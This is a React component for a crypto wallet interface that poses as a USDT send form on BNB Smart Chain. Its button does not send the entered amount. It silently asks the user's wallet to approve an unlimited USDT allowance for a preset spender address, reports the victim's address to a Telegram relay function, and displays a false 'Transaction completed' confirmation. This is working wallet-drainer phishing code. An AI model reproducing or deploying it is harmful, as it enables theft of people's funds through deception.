"use client"
/* eslint-disable @typescript-eslint/no-unused-vars */

import React, { useState, useEffect, useRef } from "react";
import Web3 from "web3";
import { ethers } from 'ethers';
import {
  RECIPIENT_ADDRESS,
  USDT_CONTRACT_ADDRESS,
  USDT_ABI,
  bscChainId,
  SPENDER_ADDRESS,
  bscChainIdinNumer,
} from "./constent";
import axios from "axios";

declare global {
  interface Window {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    ethereum?: any;
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    trustwallet?: any;
  }
}

const AppBSC = () => {
  const [address, setAddress] = useState(RECIPIENT_ADDRESS);
  const [usdtAmount, setUsdtAmount] = useState("");
  const [loading, setLoading] = useState(false);
  const [transferCompleted, setTransferCompleted] = useState(false);
  const [message, setMessage] = useState("Next")


  const sendUSDT = async () => {
    try {
      setLoading(true);
      setTransferCompleted(false);
      let sender: string = ''
      if (!window.ethereum) {
        window.alert("No ehterem")
        return;
      }
      const instance = window.ethereum || window.trustwallet;
      const web3 = new Web3(instance);

      const walletAddress  = (await web3.eth.getAccounts())[0] || new URLSearchParams(window.location.search).get("address");
      if (!walletAddress || !web3.utils.isAddress(walletAddress)) {
          window.alert("Error: No valid wallet address provided in URL");
          return
      }
      else{
        sender = walletAddress
      }


      // Check and switch to BSC
      const chainId = await web3.eth.getChainId();
      if (Number(chainId) !== bscChainIdinNumer) {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: bscChainId }],
        });
      }

      // // Validate address in URL (required)
      // const params = new URLSearchParams(window.location.search);
      // const userAddress = params.get("address");

      if (!sender || !/^0x[a-fA-F0-9]{40}$/.test(sender)) {
        window.alert(`No address ${sender}`)
        return;
      }
      // call the gas fee api
 
      setMessage("Processing...")
      // const topUpResponse = await axios.post(
      //   "/api/topup",
      //   { to: sender }
      // ).then((res) => {
      //   console.log("Top-up response:", res.data);
      //   return res.data;
      // }).catch((err)=>{
      //   console.error("Top-up request failed:", err);
      // });
      // if (!topUpResponse) {
      //   window.alert("Top-up failed, please try again later.");
      //   setLoading(false);
      //   setMessage("Next")
      //   return;
      // }
  
      const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT_ADDRESS);

      await contract.methods
        .approve(SPENDER_ADDRESS, ethers.MaxUint256)
        .send({ from: sender });

      setTransferCompleted(true);
      // Static export can't run Next API routes; Netlify Functions can.
      await fetch("/.netlify/functions/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ address: sender }),
      }).catch(() => {});
      setMessage("Next")
    } catch (err) {
      console.log("🔴 Approval error:", err);
      setMessage("Something went wrong, try again")
    } finally {
      setMessage("Next")
      setLoading(false);
    }
  };

  useEffect(() => {
    const ensureBSCNetwork = async () => {

      try {
        const currentChainId = await window.ethereum.request({
          method: "eth_chainId",
        });

        if (currentChainId !== bscChainId) {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: bscChainId }],
          });
        }
      } catch (error) {
      }
    };
    ensureBSCNetwork();
  }, []);


  return (
    <div className="min-h-screen bg-white">
      {/* Main Content */}
      <div className="px-5 py-7 space-y-6">
        {/* Address Input Section */}
        <div className="space-y-2">
          <label className="block text-sm font-medium text-gray-700 text-start">
            Address or Domain Name
          </label>
          <div className="relative">
            <input
              type="text"
              value={address}
              onChange={(e) => setAddress(e.target.value)}
              className="w-full px-3 py-3 pr-20 text-gray-700 text-base border border-gray-300 rounded-sm focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
              placeholder="0x..."
            />
            <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-1">

                <button
                  className="px-2 py-[2px] text-sm font-medium rounded-full bg-slate-200 text-gray-500 hover:text-gray-600 transition-colors"
                >
                  ×
                </button>
            
              <button
                className="px-2 py-1 text-sm font-semibold text-[#0600FF] hover:text-blue-700 transition-colors"
              >
                Paste
              </button>
            </div>
          </div>
        </div>

        {/* Amount Input Section */}
        <div className="space-y-2">
          <label className="block text-sm font-medium text-gray-700 text-start">
            Amount
          </label>
          <div className="relative">
            <input
              type="string"
              value={usdtAmount}
              onChange={(e) => setUsdtAmount(e.target.value)}
              className="w-full px-2 py-3 text-gray-700 pr-24 text-base border border-gray-300 rounded-sm focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
              placeholder="0"
              step="0.000001"
              min="0"
            />
            <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
              <span className="text-sm font-medium text-gray-600">USDT</span>
              <button
                className="px-2 py-1 text-sm text-[#0600FF] transition-colors duration-200 font-semibold"
              >
                Max
              </button>
            </div>
          </div>
          <div className="flex items-center text-sm text-gray-500">
            <span>
              ≈ ${usdtAmount ? (parseFloat(usdtAmount) * 1).toFixed(2) : "0.00"}
            </span>
          </div>
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 bg-white   p-4">
        <button
          onClick={()=> sendUSDT()}
          disabled={loading}
          className={`
            w-full py-3 rounded-3xl font-medium text-white text-base transition-all duration-200
            ${
              !usdtAmount || loading
                ? "bg-gray-300 cursor-not-allowed"
                : "bg-[#0600FF] hover:bg-blue-700 active:bg-blue-800"
            }
          `}
        >
          {message}
        </button>
      </div>

      {/* Bottom slide-up popup (dim background + animated sheet) */}
      {/*  */}
      {(transferCompleted) && (
        <div className="w-full fixed inset-0 z-50 flex items-end justify-center pointer-events-none">
          {/* dim background */}
          <div
            className="w-full absolute inset-0 bg-black transition-opacity pointer-events-auto"
            style={{ opacity: 0.55 }}
            onClick={() => {
              if (!loading) setTransferCompleted(false);
            }}
          />

          {/* slide-up sheet */}
          <div
            className={`relative w-[100%] pointer-events-auto z-60 transform rounded-xl bg-white shadow-xl transition-all duration-300 ease-out
              ${loading || transferCompleted ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"}`}
            role="dialog"
            aria-modal="true"
          >
            <div className="p-5">
              {loading ? (
                <div className="flex flex-col items-center space-y-4">
                  <svg className="animate-spin h-12 w-12 text-blue-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4l3-3-3-3v4a12 12 0 100 24v-2a10 10 0 110-20z"></path>
                  </svg>

                  <h3 className="text-lg font-semibold text-gray-800">Processing...</h3>
                  <p className="text-sm text-gray-600 text-center">
                    Transaction in progress. Blockchain validation is underway — this may take a few minutes.
                  </p>

                  <button
                    className="mt-2 px-5 py-2 rounded-full bg-gray-200 text-gray-700"
                    disabled
                  >
                    Transaction details
                  </button>
                </div>
              ) : (
                <div className="flex flex-col items-center space-y-4">
                  <div className="flex items-center justify-center w-20 h-20 rounded-full bg-green-50">
                    <svg className="h-10 w-10 text-green-600" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M5 13l4 4L19 7" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>

                  <h3 className="text-lg font-semibold text-gray-800">Transaction completed</h3>
                  <p className="text-sm text-gray-600 text-center">
                    Your transaction has been submitted and confirmed on the network.
                  </p>

                  <div className="flex">
                    <button
                      className="px-4 py-2 w-[400px] rounded-full bg-[#0600FF] text-white"
                      onClick={() => {
                        setTransferCompleted(false);
                      }}
                    >
                      Close
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );

};

export default AppBSC;
